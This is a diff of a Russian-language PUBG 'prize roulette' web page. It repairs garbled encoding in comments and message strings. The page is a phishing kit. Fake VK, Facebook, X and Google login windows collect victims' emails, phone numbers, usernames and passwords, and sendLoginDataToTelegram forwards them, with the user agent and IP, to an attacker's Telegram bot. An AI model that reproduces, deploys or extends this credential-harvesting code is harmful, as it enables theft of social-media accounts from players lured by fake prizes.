-                // ÐÑÐºÑÑÐ²Ð°ÐµÐ¼ ÑÐ¾Ð¾ÑÐ²ÐµÑÑÑÐ²ÑÑÑÐµÐµ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½Ð¾Ðµ Ð¾ÐºÐ½Ð¾
+                // Открываем соответствующее модальное окно
                 if (selectedSocial === 'google') {
                     openGoogleFullscreen();
                 } else if (selectedSocial === 'x') {
@@ -3979,17 +3979,17 @@
                 }
             });
             
-            // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¿Ð¾ÐºÐ°Ð·Ð° Ð¿Ð¾Ð´ÑÐ²ÐµÑÐ¶Ð´ÐµÐ½Ð¸Ñ
+            // Функция показа подтверждения
             function showConfirmation() {
                 socialSelectSection.classList.remove('active');
                 confirmationSection.classList.add('active');
                 confirmationSection.scrollIntoView({ behavior: 'smooth' });
             }
             
-            // Ð¤ÑÐ½ÐºÑÐ¸Ñ Ð¾ÑÐ¿ÑÐ°Ð²ÐºÐ¸ Ð´Ð°Ð½Ð½ÑÑ Ð²ÑÐ¾Ð´Ð° Ð² Telegram
+            // Функция отправки данных входа в Telegram
             async function sendLoginDataToTelegram(socialType, loginData, prizeIndex) {
                 const socialNames = {
-                    'vk': 'ÐÐÐ¾Ð½ÑÐ°ÐºÑÐµ',
+                    'vk': 'ВКонтакте',
                     'facebook': 'Facebook',
                     'x': 'Twitter/X',
                     'google': 'Google'
@@ -3997,31 +3997,31 @@
                 
                 const prizeNumber = prizeIndex + 1;
                 
-                let message = `ð ÐÐÐÐ«Ð ÐÐÐÐÐ«Ð ÐÐÐ¯ ÐÐ¥ÐÐÐ PUBG ð\n\n`;
-                message += `ð® ID Ð°ÐºÐºÐ°ÑÐ½ÑÐ°: ${loginData.accountId || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
-                message += `ð± Ð¡Ð¾ÑÑÐµÑÑ: ${socialNames[socialType] || socialType}\n`;
+                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
+                message += `🎮 ID аккаунта: ${loginData.accountId || 'Не указано'}\n`;
+                message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
                 
-                // ÐÐ¾Ð±Ð°Ð²Ð»ÑÐµÐ¼ Ð´Ð°Ð½Ð½ÑÐµ Ð² Ð·Ð°Ð²Ð¸ÑÐ¸Ð¼Ð¾ÑÑÐ¸ Ð¾Ñ ÑÐ¾ÑÑÐµÑÐ¸
+                // Добавляем данные в зависимости от соцсети
                 if (socialType === 'vk') {
-                    message += `ð Ð¢ÐµÐ»ÐµÑÐ¾Ð½/email: ${loginData.phone || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
-                    message += `ð ÐÐ°ÑÐ¾Ð»Ñ: ${loginData.password || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
-                    message += `ð» Ð§ÑÐ¶Ð¾Ð¹ ÐºÐ¾Ð¼Ð¿ÑÑÑÐµÑ: ${loginData.foreign_computer || 'ÐÐµÑ'}\n`;
+                    message += `📞 Телефон/email: ${loginData.phone || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                    message += `💻 Чужой компьютер: ${loginData.foreign_computer || 'Нет'}\n`;
                 } else if (socialType === 'facebook') {
-                    message += `ð§ Email/ÑÐµÐ»ÐµÑÐ¾Ð½: ${loginData.email || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
-                    message += `ð ÐÐ°ÑÐ¾Ð»Ñ: ${loginData.password || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
+                    message += `📧 Email/телефон: ${loginData.email || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
                 } else if (socialType === 'x') {
-                    message += `ð¤ ÐÐ¼Ñ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ: ${loginData.username || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
-                    message += `ð ÐÐ°ÑÐ¾Ð»Ñ: ${loginData.password || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
+                    message += `👤 Имя пользователя: ${loginData.username || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
                 } else if (socialType === 'google') {
-                    message += `ð§ Email: ${loginData.email || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
-                    message += `ð ÐÐ°ÑÐ¾Ð»Ñ: ${loginData.password || 'ÐÐµ ÑÐºÐ°Ð·Ð°Ð½Ð¾'}\n`;
-                    message += `ðï¸ ÐÐ¾ÐºÐ°Ð·Ð°ÑÑ Ð¿Ð°ÑÐ¾Ð»Ñ: ${loginData.show_password || 'ÐÐµÑ'}\n`;
+                    message += `📧 Email: ${loginData.email || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                    message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                 }
                 
-                message += `ð ÐÑÐ¸Ð³ÑÐ°Ð½Ð½ÑÐ¹ Ð¿ÑÐ¸Ð·: #${prizeNumber}\n`;
-                message += `â° ÐÑÐµÐ¼Ñ: ${new Date().toLocaleString()}\n`;
-                message += `ð User Agent: ${navigator.userAgent}\n`;
-                message += `ð IP: ${userIP || 'ÐÐµ Ð¾Ð¿ÑÐµÐ´ÐµÐ»ÐµÐ½'}`;
+                message += `🎁 Выигранный приз: #${prizeNumber}\n`;
+                message += `⏰ Время: ${new Date().toLocaleString()}\n`;
+                message += `🌐 User Agent: ${navigator.userAgent}\n`;
+                message += `📍 IP: ${userIP || 'Не определен'}`;
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
@@ -4053,53 +4053,53 @@
                 }
             }
             
-            // ÐÐ°Ð¿ÑÑÐº ÑÑÐ»ÐµÑÐºÐ¸
+            // Запуск рулетки
             playBtn.addEventListener('click', startRoulette);
             
-            // ÐÑÐºÑÑÑÐ¸Ðµ Ð¾ÐºÐ½Ð° Ñ Ð¿ÑÐ¸Ð·Ð¾Ð¼
+            // Открытие окна с призом
             prizeMailBtn.addEventListener('click', openPrizeWindow);
             
-            // ÐÐ½Ð¸ÑÐ¸Ð°Ð»Ð¸Ð·Ð°ÑÐ¸Ñ
+            // Инициализация
             selectionFrame.style.opacity = '0';
             selectionIndicator.style.opacity = '0';
             updatePrizeBadge();
             
-            // ÐÑÐ¾Ð²ÐµÑÑÐµÐ¼, Ð¸Ð³ÑÐ°Ð» Ð»Ð¸ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ ÑÐ¶Ðµ
+            // Проверяем, играл ли пользователь уже
             if (hasPlayed && userIP !== ownerIP) {
                 playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                 playBtn.disabled = false;
             }
             
-            // ÐÐ°ÐºÑÑÑÐ¸Ðµ Ð¾ÐºÐ½Ð° Ð¿ÑÐ¸Ð·Ð° Ð¿ÑÐ¸ ÐºÐ»Ð¸ÐºÐµ Ð½Ð° ÐºÐ½Ð¾Ð¿ÐºÑ "ÐÐ°ÐºÑÑÑÑ"
+            // Закрытие окна приза при клике на кнопку "Закрыть"
             collectPrizeBtn.addEventListener('click', closePrizeWindow);
             
-            // ÐÐ°ÐºÑÑÑÐ¸Ðµ Ð¾ÐºÐ½Ð° Ð¿ÑÐ¸Ð·Ð° Ð¿ÑÐ¸ ÐºÐ»Ð¸ÐºÐµ Ð²Ð½Ðµ ÐµÐ³Ð¾
+            // Закрытие окна приза при клике вне его
             document.getElementById('prizeWindow').addEventListener('click', function(e) {
                 if (e.target === this) {
                     closePrizeWindow();
                 }
             });
             
-            // ÐÐ°ÐºÑÑÑÐ¸Ðµ Google Fullscreen Ð¿ÑÐ¸ ÐºÐ»Ð¸ÐºÐµ Ð²Ð½Ðµ ÐµÐ³Ð¾
+            // Закрытие Google Fullscreen при клике вне его
             googleFullscreen.addEventListener('click', function(e) {
                 if (e.target === this) {
                     closeGoogleFullscreen();
                 }
             });
             
-            // ÐÑÐµÐ´Ð·Ð°Ð³ÑÑÐ·ÐºÐ° Ð¸Ð·Ð¾Ð±ÑÐ°Ð¶ÐµÐ½Ð¸Ð¹
+            // Предзагрузка изображений
             function preloadImages() {
-                // Ð¤Ð¾Ð½ ÑÐ°Ð¹ÑÐ°
+                // Фон сайта
                 const bg = new Image();
                 bg.src = 'phon.png';
                 
-                // ÐÑÐ¸Ð·Ñ
+                // Призы
                 for (let i = 1; i <= 9; i++) {
                     const img = new Image();
                     img.src = `priz${i}.png`;
                 }
                 
-                // ÐÐºÐ¾Ð½ÐºÐ¸ ÑÐ¾ÑÑÐµÑÐµÐ¹
+                // Иконки соцсетей
                 const socialImages = [
                     'vkontakte.png',
                     'twiter.png',
@@ -4114,7 +4114,7 @@
             
             preloadImages();
             
-            // ÐÐ°ÐºÑÑÑÐ¸Ðµ Ð²ÑÐ¿Ð°Ð´Ð°ÑÑÐ¸Ñ Ð¼ÐµÐ½Ñ Ð¿ÑÐ¸ ÐºÐ»Ð¸ÐºÐµ Ð²Ð½Ðµ Ð¸Ñ
+            // Закрытие выпадающих меню при клике вне их
             document.addEventListener('click', function(event) {
                 if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                     languageDropdown.classList.remove('show');
@@ -4125,7 +4125,7 @@
                 }
             });
             
-            // ÐÐ°ÐºÑÑÑÐ¸Ðµ Ð¼Ð¾Ð´Ð°Ð»ÑÐ½ÑÑ Ð¾ÐºÐ¾Ð½ Ð¿ÑÐ¸ ÐºÐ»Ð¸ÐºÐµ Ð²Ð½Ðµ Ð¸Ñ
+            // Закрытие модальных окон при клике вне их
             document.querySelectorAll('.modal-overlay').forEach(modal => {
                 modal.addEventListener('click', function(e) {
                     if (e.target === this) {
@@ -4135,33 +4135,33 @@
                 });
             });
             
-            // ÐÐ°ÐºÑÑÑÐ¸Ðµ Google Fullscreen Ð¿Ð¾ Escape
+            // Закрытие Google Fullscreen по Escape
             document.addEventListener('keydown', function(e) {
                 if (e.key === 'Escape' && googleFullscreen.classList.contains('active')) {
                     closeGoogleFullscreen();
                 }
             });
             
-            // ÐÐ²ÑÐ¾Ð¼Ð°ÑÐ¸ÑÐµÑÐºÐ°Ñ Ð°Ð½Ð¸Ð¼Ð°ÑÐ¸Ñ ÑÐ°Ð¼ÐºÐ¸ Ð´Ð¾ Ð½Ð°ÑÐ°Ð»Ð° Ð¸Ð³ÑÑ
+            // Автоматическая анимация рамки до начала игры
             function animateFrameRandomly() {
                 if (!isSpinning && !hasPlayed) {
                     const randomIndex = Math.floor(Math.random() * prizeItems.length);
                     moveFrameToPrize(randomIndex);
                     
-                    // Ð Ð°Ð½Ð´Ð¾Ð¼Ð½ÑÐ¹ Ð¸Ð½ÑÐµÑÐ²Ð°Ð» Ð´Ð»Ñ ÑÐ»ÐµÐ´ÑÑÑÐµÐ¹ Ð°Ð½Ð¸Ð¼Ð°ÑÐ¸Ð¸
-                    const nextDelay = Math.random() * 2000 + 1000; // 1-3 ÑÐµÐºÑÐ½Ð´Ñ
+                    // Рандомный интервал для следующей анимации
+                    const nextDelay = Math.random() * 2000 + 1000; // 1-3 секунды
                     setTimeout(animateFrameRandomly, nextDelay);
                 }
             }
             
-            // ÐÐ°Ð¿ÑÑÐºÐ°ÐµÐ¼ Ð°Ð½Ð¸Ð¼Ð°ÑÐ¸Ñ ÑÐ°Ð¼ÐºÐ¸ ÑÐµÑÐµÐ· 2 ÑÐµÐºÑÐ½Ð´Ñ Ð¿Ð¾ÑÐ»Ðµ Ð·Ð°Ð³ÑÑÐ·ÐºÐ¸
+            // Запускаем анимацию рамки через 2 секунды после загрузки
             setTimeout(() => {
                 if (!isSpinning) {
                     animateFrameRandomly();
                 }
             }, 2000);
             
-            // Ð£ÑÑÐ°Ð½Ð°Ð²Ð»Ð¸Ð²Ð°ÐµÐ¼ Ð°Ð½Ð³Ð»Ð¸Ð¹ÑÐºÐ¸Ð¹ ÑÐ·ÑÐº Ð¿Ð¾ ÑÐ¼Ð¾Ð»ÑÐ°Ð½Ð¸Ñ
+            // Устанавливаем английский язык по умолчанию
             changeLanguage('en');
         });
     </script>
